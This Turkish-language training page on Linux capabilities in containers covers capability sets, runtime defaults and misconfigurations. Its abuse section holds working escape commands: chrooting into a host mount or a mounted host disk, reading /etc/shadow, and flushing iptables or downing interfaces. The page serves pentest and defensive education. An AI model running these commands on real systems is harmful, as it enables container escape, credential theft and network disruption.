# Container'larda Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## Genel Bakış

Linux capabilities, container security konusunun en önemli parçalarından biridir; çünkü temel ve incelikli bir soruya yanıt verir: **Bir container içinde "root" gerçekten ne anlama gelir?** Normal bir Linux sisteminde UID 0, tarihsel olarak çok geniş bir privilege set anlamına gelirdi. Modern kernel'larda bu privilege, capabilities adı verilen daha küçük birimlere ayrılmıştır. İlgili capabilities kaldırılmışsa bir process root olarak çalışsa bile birçok güçlü işlemi gerçekleştiremeyebilir.

Container'lar bu ayrımdan büyük ölçüde yararlanır. Birçok workload, uyumluluk veya basitlik nedenleriyle container içinde hâlâ UID 0 olarak başlatılır. Capability dropping olmadan bu durum fazlasıyla tehlikeli olurdu. Capability dropping uygulandığında ise container içindeki root process, birçok sıradan in-container görevini gerçekleştirmeye devam ederken daha hassas kernel işlemleri engellenebilir. Bu nedenle `uid=0(root)` gösteren bir container shell'i otomatik olarak "host root" veya hatta "geniş kernel privilege" anlamına gelmez. Bu root identity'nin gerçekte ne kadar değerli olduğunu capability set'leri belirler.

Linux capabilities için tam referans ve birçok abuse örneği için bkz.:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## İşleyiş

Capabilities; permitted, effective, inheritable, ambient ve bounding set'leri dâhil olmak üzere birkaç set içinde takip edilir. Birçok container assessment'ı için her set'in kesin kernel semantics'i, daha doğrudan önem taşıyan şu pratik sorudan daha az önemlidir: **Bu process şu anda hangi privileged işlemleri başarıyla gerçekleştirebilir ve gelecekte hangi privilege gains hâlâ mümkündür?**

Bunun önemli olmasının nedeni, birçok breakout tekniğinin aslında container problemleri kılığına girmiş capability problemleri olmasıdır. `CAP_SYS_ADMIN` içeren bir workload, normal bir container root process'inin dokunmaması gereken çok büyük miktarda kernel functionality'ye erişebilir. `CAP_NET_ADMIN` içeren bir workload, host network namespace'ini de paylaşıyorsa çok daha tehlikeli hâle gelir. `CAP_SYS_PTRACE` içeren bir workload, host PID sharing üzerinden host process'lerini görebiliyorsa çok daha ilgi çekici olur. Docker veya Podman'da bu, `--pid=host` olarak görünebilir; Kubernetes'te ise genellikle `hostPID: true` olarak görünür.

Başka bir deyişle capability set, izole şekilde değerlendirilemez. Namespaces, seccomp ve MAC policy ile birlikte incelenmelidir.

## Lab

Bir container içindeki capabilities'leri incelemenin oldukça doğrudan bir yolu şudur:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Daha kısıtlayıcı bir container'ı, tüm capabilities'lerin eklendiği bir container ile de karşılaştırabilirsiniz:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Dar bir eklemenin etkisini görmek için her şeyi kaldırıp yalnızca bir capability eklemeyi deneyin:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Bu küçük deneyler, bir runtime'ın yalnızca "privileged" adlı bir boolean değeri açıp kapatmadığını göstermeye yardımcı olur. Runtime, süreç için kullanılabilir gerçek privilege surface'i şekillendirir.

## Yüksek Riskli Capabilities

Hedefe bağlı olarak birçok capability önemli olabilse de container escape analizinde bazıları tekrar tekrar öne çıkar.

**`CAP_SYS_ADMIN`**, defenders'ın en fazla şüpheyle yaklaşması gereken capability'dir. Genellikle "new root" olarak tanımlanır; çünkü mount ile ilgili işlemler, namespace'e duyarlı davranışlar ve container'lara gelişigüzel biçimde açılmaması gereken birçok kernel path'i dahil olmak üzere çok büyük miktarda işlevselliğin kilidini açar. Bir container'da `CAP_SYS_ADMIN`, zayıf seccomp ve güçlü MAC confinement yoksa birçok klasik breakout path'i çok daha gerçekçi hale gelir.

Özellikle PID namespace host ile veya ilgi çekici komşu workload'larla paylaşılıyorsa, süreç görünürlüğünün bulunduğu durumlarda **`CAP_SYS_PTRACE`** önemlidir. Görünürlüğü tampering yapma yeteneğine dönüştürebilir.

Network odaklı ortamlarda **`CAP_NET_ADMIN`** ve **`CAP_NET_RAW`** önemlidir. İzole bir bridge network üzerinde bile riskli olabilirler; shared host network namespace üzerinde ise çok daha tehlikelidirler, çünkü workload host networking'i yeniden yapılandırabilir, sniffing veya spoofing yapabilir ya da yerel traffic flow'larına müdahale edebilir.

Rootful bir ortamda **`CAP_SYS_MODULE`** genellikle catastrophic'tir; çünkü kernel module yüklemek, fiilen host kernel kontrolü anlamına gelir. Genel amaçlı bir container workload'unda neredeyse hiçbir zaman bulunmamalıdır.

## Runtime Kullanımı

Docker, Podman, containerd tabanlı stack'ler ve CRI-O, capability kontrollerinin tümünü kullanır; ancak varsayılanlar ve yönetim arayüzleri farklıdır. Docker bunları `--cap-drop` ve `--cap-add` gibi flag'ler üzerinden doğrudan sunar. Podman benzer kontroller sunar ve ek bir güvenlik katmanı olarak rootless execution'dan sıklıkla faydalanır. Kubernetes, capability ekleme ve kaldırma işlemlerini Pod veya container `securityContext` üzerinden sunar. LXC/Incus gibi system-container ortamları da capability kontrolüne dayanır; ancak bu sistemlerin daha geniş host entegrasyonu, operatörleri app-container ortamına kıyasla varsayılanları daha agresif biçimde gevşetmeye yöneltebilir.

Aynı ilke hepsi için geçerlidir: Teknik olarak grant edilebilen bir capability, mutlaka grant edilmesi gereken bir capability değildir. Gerçek dünyadaki birçok incident, bir workload daha strict bir configuration altında başarısız olduğunda ve ekibin hızlı bir fix'e ihtiyaç duyduğunda, operatörün yalnızca capability eklemesiyle başlar.

## Yanlış Yapılandırmalar

En bariz hata, Docker/Podman tarzı CLI'larda **`--cap-add=ALL`** kullanmaktır; ancak tek hata bu değildir. Uygulamada daha yaygın bir problem, namespace, seccomp ve mount etkileri tam olarak anlaşılmadan, özellikle `CAP_SYS_ADMIN` olmak üzere bir veya iki son derece güçlü capability'nin "application'ı çalıştırmak" amacıyla grant edilmesidir. Bir diğer yaygın failure mode, ek capability'lerin host namespace sharing ile birleştirilmesidir. Docker veya Podman'da bu, `--pid=host`, `--network=host` veya `--userns=host` olarak görünebilir; Kubernetes'te eşdeğer exposure genellikle `hostPID: true` veya `hostNetwork: true` gibi workload ayarlarıyla ortaya çıkar. Bu kombinasyonların her biri, capability'nin gerçekte neleri etkileyebileceğini değiştirir.

Ayrıca administrator'ların, bir workload tamamen `--privileged` olmadığı için hâlâ anlamlı biçimde kısıtlandığına inandığını görmek de yaygındır. Bu bazen doğrudur; ancak bazen effective posture zaten privileged'a yeterince yakındır ve bu ayrım operational olarak önemini yitirir.

## Kötüye Kullanım

İlk practical step, effective capability set'ini enumerate etmek ve escape veya host information access açısından önemli olabilecek capability-specific action'ları hemen test etmektir:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
`CAP_SYS_ADMIN` mevcutsa, en yaygın breakout kolaylaştırıcılarından biri olduğu için öncelikle mount tabanlı abuse ve host filesystem erişimini test edin:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
`CAP_SYS_PTRACE` mevcutsa ve container ilginç process'leri görebiliyorsa, capability'nin process inspection'a dönüştürülüp dönüştürülemeyeceğini doğrulayın:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
`CAP_NET_ADMIN` veya `CAP_NET_RAW` mevcutsa, workload'un görünür network stack'i manipüle edip edemediğini veya en azından faydalı network bilgileri toplayıp toplayamadığını test edin:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Bir capability testi başarılı olduğunda, bunu namespace durumu ile birlikte değerlendirin. Yalıtılmış bir namespace'te yalnızca riskli görünen bir capability, container aynı zamanda host PID, host network veya host mounts paylaştığında hemen bir escape ya da host-recon primitive'ine dönüşebilir.

### Tam Örnek: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Container'da `CAP_SYS_ADMIN` ve `/host` gibi host filesystem'in yazılabilir bir bind mount'ı varsa escape yolu genellikle basittir:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
`chroot` başarılı olursa, komutlar artık host root dosya sistemi bağlamında çalıştırılır:
```bash
id
hostname
cat /etc/shadow | head
```
`chroot` kullanılamıyorsa, aynı sonuç çoğu zaman binary'yi mount edilmiş tree üzerinden çağırarak elde edilebilir:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Tam Örnek: `CAP_SYS_ADMIN` + Cihaz Erişimi

Ana makineden bir block device açığa çıkarılırsa, `CAP_SYS_ADMIN` bunu doğrudan ana makine dosya sistemi erişimine dönüştürebilir:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Tam Örnek: `CAP_NET_ADMIN` + Host Networking

Bu kombinasyon her zaman doğrudan host root sağlamaz, ancak host ağ yığınını tamamen yeniden yapılandırabilir:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Bu, denial of service, trafiğin ele geçirilmesi veya daha önce filtrelenmiş servislere erişim sağlayabilir.

## Checks

Capability kontrollerinin amacı yalnızca ham değerleri dökmek değil, sürecin mevcut namespace ve mount durumunu tehlikeli hâle getirecek kadar ayrıcalığa sahip olup olmadığını anlamaktır.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Burada ilgi çekici olanlar:

- `capsh --print`, `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` veya `cap_sys_module` gibi yüksek riskli capabilities'leri tespit etmenin en kolay yoludur.
- `/proc/self/status` içindeki `CapEff` satırı, yalnızca diğer setlerde mevcut olabilecekleri değil, şu anda gerçekten effective olanları gösterir.
- Container ayrıca host PID, network veya user namespaces'lerini paylaşıyorsa ya da yazılabilir host mount'larına sahipse, capability dökümü çok daha önemli hale gelir.

Ham capability bilgilerini topladıktan sonraki adım yorumlamadır. Process'in root olup olmadığını, user namespaces'lerin etkin olup olmadığını, host namespaces'lerin paylaşılıp paylaşılmadığını, seccomp'un enforcing durumda olup olmadığını ve AppArmor veya SELinux'un process'i hâlâ kısıtlayıp kısıtlamadığını değerlendirin. Tek başına bir capability seti hikâyenin yalnızca bir parçasıdır; ancak çoğu zaman bir container breakout'un neden çalıştığını, aynı görünen başlangıç noktasıyla diğerinin neden başarısız olduğunu açıklayan kısımdır.

## Runtime Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak azaltılmış capability seti | Docker, varsayılan bir capabilities allowlist'i tutar ve geri kalanları düşürür | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Varsayılan olarak azaltılmış capability seti | Podman containers varsayılan olarak unprivileged'dır ve azaltılmış bir capability modeli kullanır | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Değiştirilmediği sürece runtime varsayılanlarını devralır | `securityContext.capabilities` belirtilmezse container, runtime'dan varsayılan capability setini alır | `securityContext.capabilities.add`, `drop: [\"ALL\"]` kullanılmaması, `privileged: true` |
| Kubernetes altında containerd / CRI-O | Genellikle runtime varsayılanı | Effective set, runtime'a ve Pod spec'ine bağlıdır | Kubernetes satırıyla aynı; doğrudan OCI/CRI yapılandırması da capabilities'leri açıkça ekleyebilir |

Kubernetes için önemli nokta, API'nin tek bir evrensel varsayılan capability seti tanımlamamasıdır. Pod capabilities eklemez veya düşürmezse workload, o node için runtime varsayılanını devralır.

{{#include ../../../../banners/hacktricks-training.md}}
